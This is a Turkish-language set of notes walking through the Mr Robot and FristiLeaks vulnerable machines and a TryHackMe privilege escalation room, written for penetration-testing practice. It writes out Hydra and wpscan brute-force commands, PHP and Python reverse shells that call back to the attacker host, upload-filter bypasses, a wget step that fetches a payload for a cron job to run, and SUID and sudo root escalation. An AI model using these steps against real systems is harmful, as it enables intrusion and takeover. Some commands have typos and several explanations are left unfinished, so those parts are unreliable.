+hydra -V -L fsocity.dic -p test 10.0.2.15 http-post-form '/wp-login.php:log=^USER^&pwd^PASS^=123&wp-submit=Log+In:F=Invalid username'
+
+çalıştırıyoruz burada /wp-login.php kısmı ilgili ip adresindeki hangi uç noktaya brute force yapılacağını belirttiğimiz kısım, ^USER^ kısmı kullanıcı adının denenceği kısımdır bu parametre --> fsocity.dic dosyasına bağlıdır yani bu dosya içerisindeki kelimeler bu parametrede denenecek pwd=^PASS^ kısmı da -p parametresinden sonra gelen test kelimesine bağlıdır burayı da fsocity.dic e bağlayabiliriz ancak bizim uygulamamızda sadece kullanıcı adını bilmek istediğimiz için bunu yapmadık yani her denemede password olarak test kelimesi denenecek ancak username olarak sırayla fsocity.dic dosyasının içerisindeki kelimeler denenecek 
+
+F:Invalid username kısmı da sadece bu hata mesajının görülmediği response ları tarama çıktısında farklı bir renk ile vurgula demektir.
+(-V = ayrıntılı çıktı [verbose anlamına gelir] -L = hangi wordlist dosyasını kullanacağımızı belirttiğimiz parametredir, -p = başlangıç olarak hangi string / kelimeyi şifre olarak deneyeceğimizi belirttiğimiz parametredir, 10.0.2.15 mr robot un ip adresidir. http-post-form = hangi tür http isteği ile brute force işlemimizi gerçekleştireceğimizi belirttiğimiz kısımdır) 
+
+tarama başlar başlamaz çok kısa bir süre içerisinde login:Elliot password: test şeklinde bir response u highlight ettiğini (vurguladığını) görüyoruz.
+
+ardından wp login sayfasına gelip Elliot | test ile giriş yaptığımızda 
+
+ERROR: The passwordyou entered for the username Elliot is incorrect yani 
+
+Elliot isimli kullanıcı için girdiğiniz şifre yanlıştır çıktısını alıyoruz bunun sebebi biz hydra ya sadece invalid username hata mesajını almadığın durumlar için iligli denemeyi vurgula dedik bu durumda şifre yanlış olduğu durum için de sağlanabileceğinden ilgili şifre ile giriş yapamadık ama Elliot isminde bir kullanıcı adının varlığından şu an eminiz
+
+
+bu dersimizde kullanıcı adı olarak bulduğumuz Elliot kullanıcısına brute force yaparak parolasını bulmaya çalışalım.
+
+kali terminalimizde fsocity.dic in bulunduğu dizindeyken
+
+wpscan --url 10.0.2.15 --passwords fsocity.dic --usernames Elliot çalıştırıyoruz daha sonra bizden database i güncellemek ister misiniz diye soruyor N yazıp enterladığımızda brute force işlemini başlatıyor.
+
+sağ altta x / y göstergesinden x = denenen kelimeler y fsocity.dic de bulunan mevcut kelime sayısı ve bunun sağındaki zaman göstergesi de taramanın ne kadar süreceğini gösteriyor.
+
+başka bir terminal tabında fsocity.dic in bulunduğu dizine gidiyoruz daha sonra,
+
+cat fsocity.dic | sort -u çalıştırdığımızda alfabetik olarak kelimelerin sıralandığını görüyoruz pek çok kelimenin aynı şekilde 2 defa yazıldığını ve ilk harfi büyük şekilde tekrar yazıldığını görüyoruz bu aynı şekilde tekrarlanan kısımları silmek istiyoruz denenecek kelime açısından daha az kelime denemek için.
+
+cat fsocity.dic | sort -u | uniq çalıştırdığımızda uniq yani her kelime benzersiz bir şekilde yalnızca 1 defa tekrarlanacak yani kendisinden başka bir kopyası olmayacak şekilde yeniden listeledik.
+
+cat fsocity.dic | sort -u | uniq > atil.dic çalıştırarak bu yeni sözlüğü atil.dic isimli bir dosyanın içerisine kaydettik ve ls -la çalıştırdığımızda fsocity.dic 7mb iken atil.dic in 96kb olduğunu görüyoruz.
+
+ve az önce başlatmış olduğumuz wpscan taramasını ctrl+c ile durduruyoruz.
+
+wpscan --url 10.0.2.15 --passwords atil.dic --usernames Elliot > N çalıştırıyoruz.
+
+ardından tarama çıktısında turuncu renkli [!] 2 adet çıktının hemen üzerinde 
+
+Valid Combinations Found:
+
+Username: Elliot, Password: ER28-0652 geçerli kombinasyon bulundu diyor ve browserımızdan wp-login sayfasına gidiyor ve Elliot | ER28-0652 ile login oluyoruz ve başarılı bir şekilde login olduğumuzu görüyoruz.
+
+sol taraftaki Users sekmesine tıkladığımızda giriş yaptığımız elliot kullanıcısının Role sütunundaki değerinin Administrator yani yönetici / adöin olduğunu görüyoruz.
+
+bu dersimizde en son olarak girdiğimiz wordpress dashboard ından sol taraftaki Media kısmına tıklarsak site içerisinde bize gösterilen resimler ve videolar yer alıyor.
+
+bu kısma bir php shell / php zararlı kod upload edebilir miyiz bunu soruyoruz kendimize çünkü eğer bunu yapabilirsek sitenin bulunduğu sunucuda bir shell alabiliriz
+
+http://pentestmonkey.net/tools/web-shells/php-reverse-shell bağlantısından Download başlığının altındaki .tarz.gz uzantılı dosyayı kali lokalimize indiriyoruz.
+
+ardından terminalden indirdiğimiz dosyanın bulunduğu dizine gidiyoruz ardından gzip -d php-reverse-shell-1.0.tar.gz  çalıştırabiliriz ya da arşive çift tıklayıp .php uzantılı dosyamızı arşivden sürükleyip de çıkartabiliriz.
+
+ardından bu .php dosyamızı sağ tık > open with geany / nano / leafpad farketmez bir text editör ile açıyoruz 
+
+ardından 49. satırdaki $ip değerini kali lokal ip mizi yazarak değiştiriyoruz ve ardından dosyamızı save edip çıkıyoruz.
+
+portu değiştirmiyoruz 1234 olarak bırakıyoruz. şimdi bu .php dosyamızı wordpress in media kısmına upload etmeye çalışalım 
+
+media kısmından sol üstteki Media Library başlığının hemen sağındaki Add New butonuna tıklıyoruz ardından .php dosyamızın bulunduğu dizine gidip dosyamızı seçiyoruz ve bu dosyayı upload edemeyeceğini söyleyen bir hata alıyoruz.
+
+daha sonra dosya arayüzünden .php dosyamızın bulunduğu dizine gidip .php dosyamıza sağ tık yapıp kopyalıyoruz ve yine bulunduğu dizinde sağ tık yapıştır diyerek dosyamızın bir kopyasını oluşturuyoruz ardından bu oluşturulan yeni kopyaya sağ tık > rename diyoruz myshell.php.png şeklinde ismini değiştirip bu şekilde upload etmeye çalışalım. (burada amacımız yüklemek istediğimiz dosyayı bir php dosyası olarak değil de bir png dosyası olarak görmesini sağlayıp ancak yüklendiğinde php kodlarımız yine çalışıp sunucuda reverse shell almak istememizden dolayı böyle yaptık)
+
+ardından Add New diyerek myshell.php.png dosyamızı seçiyoruz. ancak yime aynı hatayı aldık yani bu dosyamızı da yüklememize izin vermedi.
+
+wordpress dashboard da sol tarafta appearence > Editor kısmına gidersek bu sitedeki wordpress in php dosyalarına ulaşabiliyoruz ve admin olarak giri yaptığımız için buradaki php dosyalarını / php kodlarını değiştirebiliyoruz.
+
+sağ taraftaki Footer kısmına tıklıyoruz ve sol tarafta açılan kodları kopyalayıp bir metin dosyasına kaydediyoruz ki çünkü bu kodları değiştirip reverse shell almaya çalışırken bozarsak geri dönebileleim diye.
+
+daha sonra php-reverse-shell.php dosyamızı bir text editör ile açıp ctrl+a > ctrl+c yapıp Footer kısmındaki bölüme yapıştırıyoruz 
+
+ardından sayfanın en altındaki mavi renkli Upload File butonuna basıyoruz.
+
+ardından reverse shell imizin çalışıp çalımadığını doğrulamak için netcat ile dinleyelim 
+
+nc -nvlp 1234 çalıştırıyoruz terminalimizde ardından tekrar browserımıza gelip adres çubuğuna 
+
+10.0.2.15/footer.php yazıp çalıştırıyoruz. ardından netcat ile dinlediğimiz terminale geldiğimizde reverse shell imizi başarılı bir şekilde aldığımızı görüyoruz.
+
+whoami çalıştırdığımızda sunucuya daemon kullanıcısı ile bağlandığımızı görebiliyoruz.
+
+cd home > ls çalıştırdığımızda robot isimli bir klasörünolduğunu görüyoruz.
+
+cd robot > ls çalıştırdığımızda key-2-of-3.txt isimli bir dosyanın olduğunu görüyoruz bu almamız gereken 2. flag dosyası cat key-2-of-3.txt çalıştırdığımızda permission denied hatası alıyoruz.
+
+ls yaptığımızda password.raw-md5 isimli bir dosyanın da olduğunu görmüştük 
+
+cat password.raw-md5 çalıştırdığımızda md5 ile hashlenmiş bir stringin olduğunu görüyoruz 
+
+https://hashes.com/en/decrypt/hash sitesinde az önce bulduğumuz md5 hashini decrypt ediyoruz 
+
+bu muhtemelen su yani super user ın şifresi su robot çalıştırdığımızda bu komutu çalıştırmamız için terminalde olmamız gerektiğini söylüyor muhtemelen biz daemon ile giriş yaptığımızda shell alarak sunucuya giriş yapmadık bu durumda ython ile shell alıp ardından su robot çalıştırıp (bu komut da robot isimli dosyayı super use (SU nun açılımı) yani root kullanıcısının yetkileriyle açıp içindeki bilgileri okumamızı sağlayan bir komut)
+
+
+
+python -c 'import pty; pty.spawn("/bin/bash)' komutunu çalıştırıyoruz ve bash shell ini başarıyla aldık.
+
+su robot > md5 ın plain text ini giriyoruz (bu plain text su nun şifresidir)
+
+ardından robot@linux larak sisteme giriş yaptığımızı görebiliyoruz (robot burada bir klasör mü yoksa kullanıcının ismi mi yani su robot yaparken ilgili klasöre root yetkisiyle mi bağlandık yoksa robot kulanıcısı ile sisteme giriş mi yaptık bunu araştır buraya yaz)
+
+cat key-2-of-3.txt çalıştırdığımızda 2.flagi başarıyla alırız.
+
+cat /etc/issues komutunun görevi ne hangi bilgileri bize gösterir araştır buraya yaz.
+
+sudo -l > md5 plain text çalıştırdığımızda robot kullanıcısı olarak bu komutu çalıştıramayacağımızı söylüyor.
+
+suid (set user id) komutu yetkisi olmayan bir dosyayı çalıştırmak isteyen kullanıcının root tarafından verilen suid izini ile -bir nevi geçici izin de diyebiliriz- biz bu suid yi kullanıp ilgili dosyayı root yetkisiyle çalıştırabiliriz 
+
+find / -perm -u=s -type -f 2>/dev/null veya find / -perm /4000 2>dev/null
+
+komutlarını çalıştırarak sistemde root olarak / root izinleri ile çalıştırabileceğimiz dosyaları bulabiliriz.
+
+(komutta find = bul / = bütün dizinlerde bul/ara demek -perm komutunun ne anlama geldiğini anlamadım araştırıp buraya yaz -u=s komutunun ne işe yaradığını da yaz -type -f = aranacak verinin bir dosya olduğunu belirttiğimiz bir parametredir 2> şeklinde neden /dev/null dizinine böyle bir yönlendirme yapılmış bunu yaz.
+/4000 sayısı ne anlama geliyor neden böyle yazdık sebebni yaz.)
+
+ardından robot@linux kullanıcısında iken find / -perm -u=s -type -f 2>/dev/null komutunu çalıştırıyoruz.
+
+gelen çıktılardan /usr/local/bin/nmap olduğunu görüyoruz bu root yetkileriyle nmap i çalıştırabileceğimiz anlamına gelir ve eğer nmap ile bir shell açabilirsek root ile shell açacağımızdan dolayı root olabiliriz
+
+nmap --interactive > !sh çalıştırdığımızda root ile shell açmış olduğumuzu whoami çalıştırarak görebiliriz.
+
+şimdi son flagimizi alalım cd root > ls > cat key-3-of-3.txt çalıştırdığımızda son flagimizi başarıyla aldık.
+
+bu dersimizde fristi leaks isimli zaafiyetli makineyi çözelim 
+
+https://www.vulnhub.com/entry/fristileaks-13,133/ bağlantısında Download başlığının altındaki bağlantılardan sanal makinayı indirebiliriz.
+
+fristi leaks sanal makinamız Red-Hat 64 bit işletim sistemine sahip.
+İndirdiğimiz .ova dosyasını virtual box a import ederken Fristi Leaks in ayarlar kısmında Network tabında 
+
+promiscuous mode u allow all yapıyoruz.
+
+ve MAC Address satırındaki değerin 08:00:27:A5:A6:76 olup olmadığını kontrol ediyoruz eğer böyleyse aynen bırakıyoruz ama değilse bu şekilde mac adresini değiştiriyoruz ve ardından sağ alttaki OK butonuna basıyoruz.
+
+ardından fristi leaks makinamızı başlatıyoruz ve açıldıktan sonra Ip Address satırında ip adresinin verildiğini göreibliyoruz bu işimize yaradı çünkü diğer türlü netdiscover çalışıtrıp fristi nin ip adresini öğrenmemiz gerekecekti.
+
+srdından kali linux u muza geçiyoruz ifconfig çalıştırarak kali local ip mizi öğreniyoruz bu örnek için 10.0.2.4 
+
+nmap -T4 -A -v 10.0.2.16 çalıştırıyoruz (buradaki ip adresi fristi leaks ip local ip adresidir)
+
+gelen tarama çıktısında 
+
+PORT  STATE SERVICE VERSION 
+
+kısmının altında 80/tcp open http Apache 2.2.15 şeklinde bir çıktı görüyoruz bu, fristi leaks de 80 portunun açık olduğu anlamına gelir.
+
+aldığımız çıktıda Running: satırında hedef sistemde çalıştırılan işletim sistemini görüyoruz 
+
+OS CPE: satırında hedef sistemdeki kernel / çekirdeğin versiyonu bilgisi yer alıyor.
+
+fristi leaks ın bir web servisi olduğunu biliyoruz (nmap taramasından açık olan 80 portundan dolayı)
+
+bu yüzden bir nikto taraması başlatalım 
+
+nikto -h http://10.0.2.16 çalıştırıyoruz.
+
+aldığımız tarama çıktısında /cola/ /sisi/ /beer/ şeklinde uç noktalar bulduk 
+
+yine aynı şekilde /icons/ ve /images/ isminde uç boktalar tespit etti nikto.
+
+ve sitede robots.txt dosyasının olduğunu söylüyor.
+
+ardından mozilla dan 10.0.2.16 adresine gidiyoruz.
+
+ancak kayda değer interaktif bir buton göremiyoruz burada bu yüzden 10.0.2.16/robots.txt adresine gidelim 
+
+burada /cola , /sisi , /beer uç noktalarını gösterdi bize bunları zaten nikto taramasından öğrenmiştik 
+
+bu 3 uç noktadaki bağlantıya gittiğimmizde karşımıza bir star wars göndermesi içeren caps karşılıyor view page source dediğimizde de herhangi başka gizli bir flag veya mesaj göremiyoruz.
+
+10.0.2.16/fristi bağlantısına gittiğimizde fristi leaks in admin portalına girmiş oluruz bu tahmini de /cola 
+/sisi /beer birer içeçek isimleri olduğu ve biizm makinamızın ismi olan fristi de bir içecek ismi / markası olduğu için bu uçnoktayı denedik
+
+admin login page de iken sağ tık > view page source diyoruz.
+
+burada 3. satırdaki content= kısmında We use base64 encoding for images cümlesi yer alıyor yani görseller için base64 kodlaması kullandık yani siteye yüklenen bir resimde (sadece bir tanesinde mi yoksa hepsinde mi araştır buraya yaz) resimin bağlantısını (resim sanal makinanın içerisinde yer alıyor internetteki bir bağlantı değil) [burada resimin binary kodlarını base64 e çevirip bir path vererek mi sitede görüntülettirilmiş burayı tam anlamadım araştırıp buraya yaz
+
+(burada muhtemelen resmin lokal url sini base64 ile şifrelediler bunu doğrulamak için araştır buraya yaz)
+
+ve bu satırın hwemen altında
+
+<!-- 
+
+--> karakterlerleriyle biten bir html yorum satırı olduğunu görüyoruz.
+
+bu yorum satırında siteyi daha iyi test etmek için bazı bilgiler bıraktığını ve daha sonra işi bitince bu bilgileri silmek için kendisine not bırakmış 
+
+ve bu yorum satırının en sonunda by eezeepz yazıor bu adminin adı olabilir yani adlin login page de denemek için bu ismi kenar not ediyoruz.
+
+13. satırda img src= kısmından sonra başlayan ve satırlarca devam eden metin admin login page deki görselin lokal url sinin base 64 e çevrilmiş halidir.
+
+ve bu base64 kodunun bittiği yerden sonra yorum satırına alınmış bir kod daha var bu kod yukarıdkai yorum satırında daha sonra silmem gerekli dediği kod; bu kodda aynı şekilde bir base64 kodudur.
+
+1728. satırda bir form var ve http post metodu ile gönderilen bir forum muhtemelen admin login page e giriş yaptığımız login formu action=checklogin.php kısmı da login olduktan sonra login olduğumuz bilgilerin checklogin.php dosyası içerisinde mevcut mu diye kontrol edildiği bölümdür.
+
+2. yorum satırındaki base64 kodunu kopyalıyoruz.
+
+ardından kali terminalimizde nano password.txt çalıştırıp > sağ tık base64 kodunu yapıştır > ctrl+o > ctrl+x 
+
+çalıştırıyoruz daha sonra base64 -d password.txt > decrypt64.png çalıştırarak bu base64 ü decode edip bu decode edilen kodu da png oalrak kaydediyoruz.
+
+ardından görsel dosya gezgininden decrypt64.png dosyasını çift tıklayarak çalıştırıyoruz.
+
+keKkeKKeKKeKkEkkEk yazısı karşımıza çıkıyor daha sonra admin login page ine gelip 
+
+
+eezeepz  ve  keKkeKKeKKeKkEkkEk bilgileriyle login oluyoruz.
+
+ve başarılı bir şşekilde login oluyoruz giriş yaptıktan sonra sayfada tıklanabilir bir şekilde upload file 
+
+yazan bir bağlantı olduğunu görüyoruz buraya tıklıyoruz.
+
+http://pentestmonkey.net/tools/web-shells/php-reverse-shell bağlantısındaki Download kısmından ilgili reverse shell almak için kullanabileceğimiz php dosyasını indirebiliriz ancak tam olarak indirildiğini kontrol et bazen tarayıcılar bu dosyayı zararlı olarak algılayıp allow yapmadan (izin vermeden) indirme işlemini gerçekleştirmiyor.
+
+ardından indirdiğimiz bu dosyaya sağ tık yapıp open with geany ile açıyoruz.
+
+49. satırdaki $ip kısmındaki değeri kali linux local ip miz ile değiştiriyoruz 10.0.2.4 yapıyoruz 
+
+ardından file sekmesinden > save yapıp geany i kapatıyoruz.
+
+ardından tarayıcıda fristileaks in upload image butonuna tıklayıp az önce dğeişiklik yaptığımız dosyayı seçip upload ediyoruz ancak bize only allowed .png .jpg .gif şeklinde bir haat veriyor bu hatayı vermesinin sebebi de güvenlik önlemi olarak sadece bu uzantıya sahip olan dosyaların yüklenmesine izin verilmesidir.
+
+biz de dosyamıza sağ tık > Rename > shell.php.png olarak değiştirip Rename butonuna basıyoruz. 
+
+ardından shell.php.png dosyamızı upload ediyoruz ve 'this file has been uploaded to /uploads'
+
+çıktısını aldık 
+
+ardından kali terminalimize gelip nc -nvlp 1234 çalıştırıyoruz ve firefox adres çubuğuna 
+
+http://10.0.2.16/fristi/uploads/shell.php.png adresine gittikten sonra nc in çalıştığı terminale geldiğimide shell imizi başarılı bir şekilde aldığımızı görebiliyoruz. enter a basıp shell e geçiyoruz 
+
+whoami çalıştırdığımızda sisteme apache kullanıcısı ile bağlandığımızı görebiliyoruz
+
+cat /etc/passwd çalıştırıyoruz ve bu komutla sistemde hangi kullanıcıların olduğuna bakabiliriz bizim sisteme bağlandığımız mevcut kullanıcımmız apache biz root kullanıcısı olmak istiyoruz.
+
+cd home > ls > cd eezeepz > ls -la > cat notes.txt çalıştırdığımızda Yo EZ, ile başlayan bir çıktı alıyoruz bu ifade eezeepz kullanıcısını ifade ediyor.
+
+bu kullanıcıya /usr/bin dizinindeki bütün programları çalıştırabileceğine dair izinlerinin olduğunu söylüyor.
+
+aynı zamanda eezeepz kullanıcısının /home/admin dizininde chmod, cat, echo gibi komutları da çalıştırabileceğini söylüyor.
+
+ve ister eezeepez ile ister şuanki kullanıcımız apache ile farketmez,  /tmp dizininin içine içerisinde her satırında çalıştırılabilir bir komut / script bulunan bir dosya oluşturursak sistem otomatik olarak cronresult isimli bir cron dosyası oluşturarak her dakika runthis dosyasını çalıştıracak ve biz de eğer 
+runthis içine bir python recerse shell scripti yerleştirirsek bu şekilde bir shell almayı başarabiliriz.
+
+ancak burada sistemde hangi programı kullanarak shell alacağımızı bilmemiz için bize notun başında söylemiş olduğu /usr/bin dizinine gidip sistemde yüklü olan programları görüp bunlardan birini seçebiliriz.
+
+bunun için ls -la /usr/bin | grep python çalıştırdığımızda sistemde python un yüklü olduğunu görebiliyoruz 
+
+ama istersek direk olarak ls -la /usr/bin çalıştırarak yüklü olan programlara bakabiliriz.
+
+ardından new tab yeni bir terminal açıyoruz daha sonra nano pythonshell.py çalıştırıyoruz 
+
+daha sonra 
+
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("kali-ip-miz",5555))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocesss.call(["/bin/sh","-i"])
+
+şeklinde düzenleyip ctrl+o ve ctrl+x yapıp çıkıyoruz. (burada portu 5555 yapmamızın sebebi 1234 portundan zaten hedef sisteme bağlandığımız için yine aynı portu seçersek çakışacağından dolayı.)
+
+ardından cp pytohnshell.py /var/www/html > service apache2 start çalıştırıyoruz 
+
+daha sonra fristi leaks e bağlandığımız terminale gelip cd /tmp > wget http://kali-local-ip/pythonshell.py 
+
+çalıştırarak wget isimli tool ile shell dosyamızı indirebiliriz 
+
+ardından ls çalıştırıp dosyamızın indirildiğini doğruluyoruz. 
+
+bu dosyayı direk olarak çalıştırırsak apache kullanıcısı olarak shell açmış oluruzz ancak biz bunu istemiyoruz biz admin kullanıcısının bu dosyayı çalıştırarak admin ile shell almak istiyoruz bunun için de
+
+öncelikle runthis iismli dosyanın olduğu dizine gidiyoruz terminalimizden 
+
+echo "/usr/bin/python /tmp/pythonshell.py" > runthis çalıştırıyoruz (bu komut ile dosyayı çalıştıran kullanıcı nasıl admin oluyor ve admin kullanıcısı ile shell aldığımızı anlamadım araştırıp buraya yaz)
+
+ardından nc -nvlp 5555 çalıştırarak ilgili portu dinliyoruz.
+
+ardından bir dakika kadar sonra shell imiz geliyor ve whoami çalıştırdığımızda admin çıktısını alıyoruz.
+
+pwd çalıştırdığımızda /home/admin dizininde olduğumuzu görüyoruz.
+
+cat cronjob.py çalıştırdığımızda  biz oluşturduğumuz reverse shell python kodlarımızı runthis isimli bir dosya oluşturarak bunun içine yönlendirdiğimizde oluşan cronjob ın zamanlanmış işlemlerini görebiliriz.
+
+cat cryptedpass.txt çalıştırdığımızda bize bir kod döndürüyor. bu kodu kopyalıyoruz.
+
+ardından whoisyourgodnow.txt çalıştırdığımızda yine aynı şekilde bir kod çıktısı alıyoruz bunu da kopyalayıp bir metin dosyasına yapıştırıyoruz (yapıştırırken karışmasın diye hangi kodun hangi dosyaya ait olduğunu yaz)
+
+ardından cat cryptpass.py çalıştırıyoruz 
+
+import base64,codecs,sys yazan satırda bu 3 modülü öncelikle programına import (içe aktarma yapıyor)
+
+(burada base64 bir hash metodu ancak diğerlerinin ne olduğunu tam anlamadım diğerlerini import etmesinin sebebi nedir araştır buraya yaz)
+
+ardından gelen satırlarda 
+
+def encodeString(str):
+    base64string=base64.b64encode(str)
+    return codecs.encode(base64string[::-1],'rot13')
+
+cryptoResult=encodeString(sys.argv[1])
+print cryptoResult
+
+burada 
+
+def encodeString(str):
+    base64string=base64.b64encode(str)
+    return codecs.encode(base64string[::-1],'rot13')
+
+    kısmında öncelikle encodeString isimli bir fonksiyon oluşturarak bu fonksiyona str argümanını alacağını söylüyor.
+
+    daha sonra base64string isimli bir değişken oluşturarak bu değişkene base64 modülünün .b64encode özelliğini kullanarak str olarak girdiğimiz stringi base64 ile encode ediyor daha sonra 
+
+       return codecs.encode(base64string[::-1],'rot13') satırında bu encode edilmiş olan metni yani base64string değişkeninin değerinin karakterlerini tersten yazarak yeniden düzenliyor (örneğin 'atil' stringini 'lita' yapıyor) ve bu tersine çevirdiği stringi tekrar rot13 isimli bir metodla yeniden hashliyor 
+
+       cryptoResult=encodeString(sys.argv[1])
+print cryptoResult
+
+bu satırlarda ne yapıldığını tam anlamadım muhtemelen base64 ve rot13 ile hashlendikten sonra metnin güncel şeklini ekrana bastırıyor ama detaylı olarak ne yaptığını araştır buraya yaz.
+
+ardından host kali terminalimizde nano decrypt.py çalıştırıyoruz ve 
+
+def decodeString(str):
+    decodedString= codecs.decode(str[::-1],'rot13')
+    return base64.b64decode(decodedString)
+
+cryptoResult=decodeString(sys.argv[1])
+print cryptoResult
+
+kodunu yapıştırıyoruz kısaca bu kodumuzda şunu yaptık 
+
+decodeString isimli bir fonksiyon oluşturduk ve bu fonksiyonun str isimli bir argüman alacağını söyledik daha sonra decodedString isimli bir değişken oluşturarak codecs isimli modülün decode isimli özelliğini kullanarak 
+ilk python dosyamızda rot ile tersine çevirilen hash i tekrar eski haline getirdik önce rot13 ü decode ettik daha sonra tersine çevrilmiş stringi normal haline getirdik.
+
+return base64.b64decode(decodedString) satırı ile de base64 ile hashlenen stringi plain text e çevirdik.
+
+daha sonra ctrl+o ve ctrl+x yaparak dosyamızdan çıkıyoruz ardından python decrypt.py ilk-kopyaladığımız-metin
+
+(crypted.txt nin içerisindeki metin) çalıştırdığımızda thisisalsopw123 çıktısını alıyoruz.
+
+ardından python decrypt.py ikinci-kopyaladığımız-metin çalıştırdığımızda LetThereBeFristi! çıktısını alıyoruz.
+
+(whoisyourgodnow.txt nin içerisindeki string)
+
+admin ile sisteme giriş yaptıktan sonra cat /etc/passwd çalıştırdığımızda burada çeşitli kullanıcılar olduğunu görüyoruz.
+
+su fristigod çalıştırıyoruz ancak bize standart in must be a tty -yani bu komutu bir shell de çalıştırmamız gerektiğini şuan bir shell imiz olmadığını söylüyor.
+
+shell almak için de python -c 'import pty; pty.spawn("/bin/sh)' komutunu sağ tık > paste clipboard yapıp yapıştırıp enterlıyoruz ardından shell imizi aldığımızı görüyoruz daha sonra su fristigod > LetThereBeFristi! çalıştırıyoruz. ardından cd .. > ls -la > cd fristigod > ls -la çalıştırdığımızda burada bir takım dosyalar var ama bizim işimize yarayan şeyler değiller
+
+bu yüzden fristigod kullanıcısının rott yetkileriyle çalıştırabileceği dosyaların ne olduğunu öğrenelim
+
+bunun için find / -user fristigod çalıştırdığımızda gelen çıktılardan 
+
+(.bash_history ve .secret_admin_stuff dosyaları bizim için önemli) bu yüzden 
+
+cd /var/fristigod > ls -la çalıştırdığımızda karşımıza çıkan bash_history isimli dosya bu dizinde çalıştırılan bash komutlarının geçmişini / daha önce çalıştırılmış bash komutlarını bize gösterir.
+
+bu dosyada bizim için bir ipucu olabilr bu yüzden cat .bash_history çalıştırdığımızda çalıştırılan bash komutlarından
+
+sudo -u fristi ./doCom ls / kodu ile (bu kodda ne yapmış tam anlamadım ama ./doCom yaparak doCom dosyasını fristi kullanıcısının yetkileri ile çalıştırmış [peki neden fristi kullanıcısının yetkileri ile çalıştırmaya ihtiyaç duymuş ve doCom dosyasını çalıştırınca ne oluyor araştır buraya yaz]) 
+
+ardından cd .secret_admin_stuff çalıştırıyoruz ardından ls -la çalıştırdığımızda doCom dosyasının burada olduğunu görebiliyoruz.
+
+ardından kali host umuzda bir terminal açıyoruz. cd /var/www/html > nano pythonshell.py çalıştırıyoruz ve ,5555 kısmını ,3333 olarak dğeiştirip ctrl+o , ctrl+x yaparak çıkıyoruz (değiştirmemizin sebebi zaten hedef sisteme 5555 portundan bağlıyız mevcut olarak)
+
+ardından kali hostumuzda service apache2 start çalıştırıyoruz ardından fristileaks e geliyoruz.
+
+wget http://10.0.2.4/pythonshell.py çalıştırarak güncel pythonshell.py dosyamızı fristileaks e indiriyoruz.
+
+daha sonra new tab den kali ostumuzdan nc -nvlp 3333 çalıştırıyoruz 
+
+ardından sudo -u fristi ./doCom /usr/bin/python /var/fristigod/.secret_admin_stuff/pythonshell.py çalıştırıyoruz.
+
+(burada /usr/bin/python kısmı ile belirttiğimiz kısım normalde localimizdeki bir dosyayı çalıştırırken python xyz.py olarak çalıştırdığımızda kullandığımız python word ünün full path idir )
+
+/var/fristigod/.secret_admin_stuff/pythonshell.py bu kısımda ise çalıştırılacak dosyanın full path inin verdik (zaten aynı dizindeydik direk dosyanın ismini yazsaydık yine çalıştırmaz mıydı araştır buraya yaz)
+
+ve nc nin çalıştığı terminale dönüp whoami çalıştırdığımızda root çıktıısnı aldık yani root olarak bağlanmayı başardık.
+
+ardından cd .. > cd .. > cd .. > cd root > cat fristileaks_secrets.txt çalıştırdığımızda aldığımız çıktı bizim root flagimizdir.
+
+bu dersimizde 
+
+https://tryhackme.com/jr/debianprivesc bağlantısındaki makineyi çözelim 
+
+https://tryhackme.com bağlantısındaki yukarıdaki Learn sekmesine dahil olan Hacktivities sekmesine gidiyoruz.
+
+bu sekmede farklı farklı odalar var ve bu odalarda farklı amaçlar için hazırlanmış ctf ler var (örneğin bir oda privilege escalations, bir oda web pentesting için vs.)
+
+bu odalardan örnek olması için OpenVPN isimli odaya tıklayarak giriyoruz.
+
+çünkü try hack me deki sanal makinalara bağlanmamız için öncelikle thm nin -kendi- networküne bağlanmamız gerekiyor bunu da openvpn ile yapıyoruz 
+
+her odada Task1-2-3.... şeklinde görevler mevcut sırayla bu görevlerin hepsini tamamlayarak sanal makinayı çözebiliriz.
+
+örneğin bu odada Task2 de openvpn i windows a nasıl kurabileceğimiz anlatılmış.
+
+Task1 de sondan bir önceki satırdaki firstly, go to the access page yazısında access kelimesine tıklayarak erişim sayfasına gidiyoruz.
+
+bunun yerine https://tryhackme.com/access bağlantısına da gidebiliriz.
+
+daha sonra açılan sayfada sağ tarafta Machine tab i seçili iken VPN Server olarak EU-Regular2 yi (türkiyeye yakın bir vpn server konumunu seçip)
+
+sol altındaki yeşil renkli Download My Configuration File butonuna basıyoruz. ardından açılan pencerede Save File a tıklıyoruz. (bu dosyayı kali lokalimize indirdik)
+
+daha sonra Task4 e tıklıyoruz burada openvpn built-in olarak sistemimizde yüklü değilse 
+
+sudo apt install openvpn çalıştırarak yükleyebileceğimizi söylüyor.
+
+ardından kali terminalimizde indirdiğimiz dısyanın olduğu dizine gidiyoruz.
+
+daha sonra openvpn indirdiğimiz-dosya.ovpn çalıştırırsak başarılı bir şekilde thm nin ağına bağlandığımızı görebiliriz.
+
+ardından başka bir terminal tabında ifconfig çalıştırdığımızda gelen çıktıda 
+
+tun0: ile başlayan satır (en aşağıdaki kısım) [tunnel kelimesinin kısaltması] tryhack me nin bizim için oluşturduğu dosyada bağlanmış olduğumuz ip adresimiz (inet satırında yazan değer)
+
+
+https://tryhackme.com/jr/debianprivesc bağlantısındaki sanal makina aslında 
+
+https://github.com/sagishahar/lpeworkshop bağlantısındaki sanal makinadır.
+
+try hack me bağlantısına gidip makinayı Deploy tuşuna basarak başlatıyoruz.
+
+başlattıktan sonra Expires başlığının altındaki zaman bilgisi bize makinayı çözmemeiz için verilen süreyi ifade eder.
+
+dilersek bu süreyi hemen sağındaki Add 1 hour butonuna basarak artırabiliriz.
+
+IP Address kısmında maknayı başlattıktan bir dakika sonra bize verilen ip adresi ni kullanarak hedef cihaza bağlanalım 
+
+user kullanıcısı ve james321 bilgileri ile hedef sisteme bağlanalım
+
+ssh user@hedef-makine-ipsi > yes yazıp enterlıyoruz > james321 çalıştırarak hedef sisteme user kullanıcısı ile bağlanabiliriz 
+
+ls -la > cd tools çalıştırdığımızda bu makinayı hacklerken kullanabileceğimiz bir takım araçların bulunduğu dizine gideriz
+
+https://github.com/mzet-/linux-exploit-suggester bağlantısındaki .sh dosyasını kullanarak linux da privilege escalation yapmamız için gerekli olan kodları bir bash script i içerisine konulmuş ki bu işlemi yaparken bir daha manual olarak yazıp zaman kaybetmeyelim diye
+
